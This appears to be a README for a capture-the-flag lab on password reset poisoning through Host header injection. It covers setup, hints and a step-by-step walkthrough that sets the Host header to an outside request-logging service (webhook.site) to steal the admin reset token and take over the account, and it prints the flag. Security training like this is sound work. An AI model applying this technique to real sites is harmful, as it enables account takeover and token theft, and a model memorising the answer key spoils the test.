# Host Header Injection CTF (Updated 2026)

**Difficulty:** Medium (200 Points)
**Objective:** Perform a Host Header Injection attack to poison a password reset link designed for the administrator, steal the reset token, and take over the admin account to find the flag.
**Flag Format:** `DAKSHH{flag}`

## Overview
This challenge simulates a classic **Password Reset Poisoning** vulnerability. The application allows users to request a password reset link. The backend dynamically generates this link using the HTTP `Host` header provided by the client, assuming it's safe. 

When a user requests a reset for the `admin` account, the backend generates the link and simulates the admin clicking on it (via a background HTTP GET request). If an attacker intercepts the request and changes the `Host` header to a server they control (e.g., `webhook.site`), the backend will send the secret reset token to the attacker's server. 

## Requirements
- Python 3.x
- `requests` and `flask` libraries

## Installation & Setup

1.  **Install Python Dependencies:**
    ```bash
    pip install flask requests
    ```

2.  **Running the CTF Locally:**
    Start the Flask server:
    ```bash
    python app.py
    ```
    The server will run on `http://0.0.0.0:5008`.

## Hints for Players
- **Hint 1**: Have you tried resetting the admin's password? Where does that link go?
- **Hint 2**: If the server is generating a link dynamically, how does it know what domain name it's hosted on? Check your HTTP request headers.
- **Hint 3**: You need a way to catch web requests. Services like `webhook.site` or `requestbin` are your friends.

## Exploitation Path (For the Admin / Walkthrough)
1.  Navigate to the application root (`/`) and observe the login page.
2.  Click on the **Forgot Password?** link (`/forgot_password`).
3.  Enter `admin` as the username and intercept the POST request using a proxy tool like Burp Suite or OWASP ZAP.
4.  In the intercepted request, locate the `Host` header (e.g., `Host: 127.0.0.1:5008`).
5.  Change the `Host` header to point to a server you control that can log incoming requests. A popular choice is [webhook.site](https://webhook.site/).
    - Example modified header: `Host: webhook.site/your-unique-id`
6.  Forward the modified request. The server will generate a password reset link like `http://webhook.site/your-unique-id/reset_password?token=XYZ` and simulate the admin clicking it by making an HTTP GET request to that URL.
7.  Check your webhook logging service. You should see an incoming GET request containing the secret reset token (e.g., `GET /your-unique-id/reset_password?token=1234-abcd...`).
8.  Copy the token. In your browser, navigate to the original target application's reset page with that token:
    `http://127.0.0.1:5008/reset_password?token=1234-abcd...`
9.  Set a new password for the admin account.
10. Navigate back to the login page (`/`) and log in as `admin` using your newly set password.
11. The application will authenticate you and display the flag: `DAKSHH{h0st_h34d3r_p01s0n1ng_f0r_t4h_w1n}`.

## Deployment Notes
-   The background admin click simulation uses the Python `threading` and `requests` modules for simplicity in this lab environment. In a high-traffic production CTF, consider using an asynchronous task queue (like Celery) to prevent blocking or thread exhaustion during intense exploitation attempts.
-   Be mindful that players could theoretically craft requests to internal network IPs (`Host: 192.168.1.1`). The `timeout=3` in `app.py` mitigates Server-Side Request Forgery (SSRF) impact, but it's something to be aware of.

---
Contributor : Jyotirmoy Karmakar(0xjyotirmoy)
